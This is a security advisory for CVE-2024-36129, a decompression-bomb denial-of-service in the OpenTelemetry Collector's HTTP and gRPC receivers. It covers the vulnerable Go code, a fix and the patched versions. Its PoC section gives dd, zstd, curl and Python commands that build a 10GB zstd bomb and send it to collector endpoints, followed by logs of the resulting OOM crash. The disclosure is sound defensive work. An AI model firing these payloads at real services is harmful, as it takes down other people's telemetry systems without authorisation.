# Denial of Service via Zip/Decompression Bomb sent over HTTP or gRPC

**GHSA**: GHSA-c74f-6mfw-mm4v | **CVE**: CVE-2024-36129 | **Severity**: high (CVSS 8.2)

**CWE**: CWE-119

**Affected Packages**:
- **go.opentelemetry.io/collector/config/confighttp** (go): < 0.102.0
- **go.opentelemetry.io/collector/config/configgrpc** (go): < 0.102.1

## Description

### Summary
An unsafe decompression vulnerability allows unauthenticated attackers to crash the collector via excessive memory consumption.

### Details
The OpenTelemetry Collector handles compressed HTTP requests by recognizing the Content-Encoding header, rewriting the HTTP request body, and allowing subsequent handlers to process decompressed data. It supports the gzip, zstd, zlib, snappy, and deflate compression algorithms. A "zip bomb" or "decompression bomb" is a malicious archive designed to crash or disable the system reading it. Decompression of HTTP requests is typically not enabled by default in popular server solutions due to associated security risks. A malicious attacker could leverage this weakness to crash the collector by sending a small request that, when uncompressed by the server, results in excessive memory consumption.

During proof-of-concept (PoC) testing, all supported compression algorithms could be abused, with zstd causing the most significant impact. Compressing 10GB of all-zero data reduced it to 329KB. Sending an HTTP request with this compressed data instantly consumed all available server memory (the testing server had 32GB), leading to an out-of-memory (OOM) kill of the collector application instance.

The root cause for this issue can be found in the following code path:

**Affected File:**
[https://github.com/open-telemetry/opentelemetry-collector/[...]confighttp/compression.go](https://github.com/open-telemetry/opentelemetry-collector/blob/062d0a7ffcd45831f993d21d1c6fb67d3e74b5e2/config/confighttp/compression.go) 

**Affected Code:**
```
// httpContentDecompressor offloads the task of handling compressed HTTP requests
// by identifying the compression format in the "Content-Encoding" header and re-writing
// request body so that the handlers further in the chain can work on decompressed data.
// It supports gzip and deflate/zlib compression.
func httpContentDecompressor(h http.Handler, eh func(w http.ResponseWriter, r *http.Request, errorMsg string, statusCode int), decoders map[string]func(body io.ReadCloser) (io.ReadCloser, error)) http.Handler {
    [...]
    d := &decompressor{
        errHandler: errHandler,
        base:   	h,
        decoders: map[string]func(body io.ReadCloser) (io.ReadCloser, error){
            "": func(io.ReadCloser) (io.ReadCloser, error) {
                // Not a compressed payload. Nothing to do.
                return nil, nil
            },
            [...]
            "zstd": func(body io.ReadCloser) (io.ReadCloser, error) {
                zr, err := zstd.NewReader(
                    body,
                    zstd.WithDecoderConcurrency(1),
                )
                if err != nil {
                    return nil, err
                }
                return zr.IOReadCloser(), nil
            },
    [...]
}

func (d *decompressor) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    newBody, err := d.newBodyReader(r)
    if err != nil {
        d.errHandler(w, r, err.Error(), http.StatusBadRequest)
        return
    }
    [...]
    d.base.ServeHTTP(w, r)
}

func (d *decompressor) newBodyReader(r *http.Request) (io.ReadCloser, error) {
    encoding := r.Header.Get(headerContentEncoding)
    decoder, ok := d.decoders[encoding]
    if !ok {
        return nil, fmt.Errorf("unsupported %s: %s", headerContentEncoding, encoding)
    }
    return decoder(r.Body)
}
```

To mitigate this attack vector, it is recommended to either disable support for decompressing client HTTP requests entirely or limit the size of the decompressed data that can be processed. Limiting the decompressed data size can be achieved by wrapping the decompressed data reader inside an io.LimitedReader, which restricts the reading to a specified number of bytes. This approach helps prevent excessive memory usage and potential out-of-memory errors caused by decompression bombs.

### PoC
This issue was confirmed as follows:

**PoC Commands:**
```
dd if=/dev/zero bs=1G count=10 | zstd > poc.zst
curl -vv "http://192.168.0.107:4318/v1/traces" -H "Content-Type: application/x-protobuf" -H "Content-Encoding: zstd" --data-binary @poc.zst
```

**Output:**
```
10+0 records in
10+0 records out
10737418240 bytes (11 GB, 10 GiB) copied, 12,207 s, 880 MB/s

* processing: http://192.168.0.107:4318/v1/traces
*   Trying 192.168.0.107:4318...
* Connected to 192.168.0.107 (192.168.0.107) port 4318
> POST /v1/traces HTTP/1.1
> Host: 192.168.0.107:4318
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type: application/x-protobuf
> Content-Encoding: zstd
> Content-Length: 336655
>
* We are completely uploaded and fine
* Recv failure: Connection reset by peer
* Closing connection
curl: (56) Recv failure: Connection reset by peer
```

**Server logs:**
```
otel-collector-1  | 2024-05-30T18:36:14.376Z    info    service@v0.101.0/service.go:102    Setting up own telemetry...
[...]
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    otlpreceiver@v0.101.0/otlp.go:152    Starting HTTP server    {"kind": "receiver", "name": "otlp", "data_type": "traces", "endpoint": "0.0.0.0:4318"}
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    service@v0.101.0/service.go:195    Everything is ready. Begin running and processing data.
otel-collector-1  | 2024-05-30T18:36:14.385Z    warn    localhostgate/featuregate.go:63    The default endpoints for all servers in components will change to use localhost instead of 0.0.0.0 in a future version. Use the feature gate to preview the new default.    {"feature gate ID": "component.UseLocalHostAsDefaultHost"}
otel-collector-1 exited with code 137
```

A similar problem exists for configgrpc when using the zstd compression:

```
dd if=/dev/zero bs=1G count=10 | zstd > poc.zst
python3 -c 'import os, struct; f = open("/tmp/body.raw", "w+b"); f.write(b"\x01"); f.write(struct.pack(">L", os.path.getsize("poc.zst"))); f.write(open("poc.zst", "rb").read())'
curl -vv http://127.0.0.1:4317/opentelemetry.proto.collector.trace.v1.TraceService/Export --http2-prior-knowledge -H "content-type: application/grpc" -H "grpc-encoding: zstd" --data-binary @/tmp/body.raw
```

### Impact
Unauthenticated attackers can crash the collector via excessive memory consumption, stopping the entire collection of telemetry.

### Patches
- The confighttp module version 0.102.0 contains a fix for this problem.
- The configgrpc module version 0.102.1 contains a fix for this problem.
- All official OTel Collector distributions starting with v0.102.1 contain both fixes.

### Workarounds
- None.

### References
- https://github.com/open-telemetry/opentelemetry-collector/pull/10289
- https://github.com/open-telemetry/opentelemetry-collector/pull/10323
- https://opentelemetry.io/blog/2024/cve-2024-36129/

### Credits
This issue was uncovered during a security audit performed by 7ASecurity, facilitated by OSTIF, for the OpenTelemetry project.
